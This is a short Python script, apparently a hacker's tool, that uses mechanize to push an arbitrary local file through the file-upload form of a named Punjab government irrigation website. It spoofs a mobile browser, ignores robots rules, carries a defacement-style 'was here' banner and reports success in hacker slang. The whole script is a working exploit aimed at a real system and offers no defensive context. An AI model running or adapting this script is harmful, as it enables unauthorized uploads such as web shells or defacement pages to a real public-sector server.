import mechanize

banner = '''
----------------------------------------\
 upsError wass here!          \
 uploading image                     \
-----------------------------------------------\
'''
b = mechanize.Browser()
b.set_handle_robots(False)
b.addheaders = [('User-agent','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36')]
print
print(banner)
path = raw_input('loc: ')

url = "http://imis.irrigation.punjab.gov.pk/Misc/FileUpload.aspx?Category=ActivityAdd"
b.open(url)
b.select_form(name="frmFileUpload")

b.form.add_file(open(path,"rb"), 'jpeg/image', filename=path, name="ExecFileUpload$UploadFile")
b.submit(name="ExecFileUpload$btnUploadFile",label='Upload')
print(b.geturl())

r = "File was successfully uploaded"

if r in b.response().read():
	print('mantap, done!')
	
print


